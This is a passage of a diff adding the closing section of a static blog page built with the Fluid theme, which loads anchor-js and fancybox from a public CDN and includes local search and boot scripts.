+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
